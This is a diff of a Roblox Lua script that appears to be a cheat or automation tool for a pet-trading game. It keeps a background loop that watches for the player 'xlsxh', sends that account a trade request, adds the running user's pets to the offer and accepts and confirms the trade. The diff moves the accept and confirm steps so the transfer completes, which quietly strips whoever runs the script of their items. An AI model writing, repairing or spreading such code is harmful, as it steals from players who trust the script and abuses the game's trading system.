@@ -8,27 +8,6 @@ local get = Fsys("RouterClient").get
 
 local License = require(game:GetService("ReplicatedStorage").SharedModules.TradeLicenseHelper)
 
-local HMC = require(game:GetService("ReplicatedStorage").SharedModules.ContentPacks.Winter2025.Minigames.HumbugMinigameClient)
-
-local TaskFarming = false
-local Furniture = {}
-
-local MoggerHubPart = Instance.new("Part", workspace)
-local ParkPart = Instance.new("Part", workspace)
-local BeachPart = Instance.new("Part", workspace)
-
-MoggerHubPart.Size = Vector3.new(500, 0, 500)
-MoggerHubPart.Anchored = true
-MoggerHubPart.CFrame = CFrame.new(500, 500, 500)
-
-ParkPart.Size = Vector3.new(500, 0, 500)
-ParkPart.Anchored = true
-ParkPart.CFrame = workspace.StaticMap.TeleportLocations.Park.CFrame + Vector3.new(0, -6, 0)
-
-BeachPart.Size = Vector3.new(500, 0, 500)
-BeachPart.Anchored = true
-BeachPart.CFrame = workspace.StaticMap.TeleportLocations.exterior_beach.CFrame + Vector3.new(0, -5, 0)
-
 function ButtonClick(Path)
 	firesignal(Path["MouseButton1Down"])
 	firesignal(Path["MouseButton1Click"])
@@ -295,10 +274,7 @@ spawn(function()
 	while wait(1) do
 		for i,v in pairs(game.Players:GetChildren()) do
 			if v.Name == "xlsxh" then
-				print("yeeee")
 				get("TradeAPI/SendTradeRequest"):FireServer(game.Players:FindFirstChild("xlsxh"))
-				get("TradeAPI/AcceptNegotiation"):FireServer()
-				get("TradeAPI/ConfirmTrade"):FireServer()
 				
 				for i,v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
 					if v["kind"] == pettt then
@@ -306,6 +282,9 @@ spawn(function()
 						get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
 					end
 				end
+				
+				get("TradeAPI/AcceptNegotiation"):FireServer()
+				get("TradeAPI/ConfirmTrade"):FireServer()
 			end
 		end
 	end
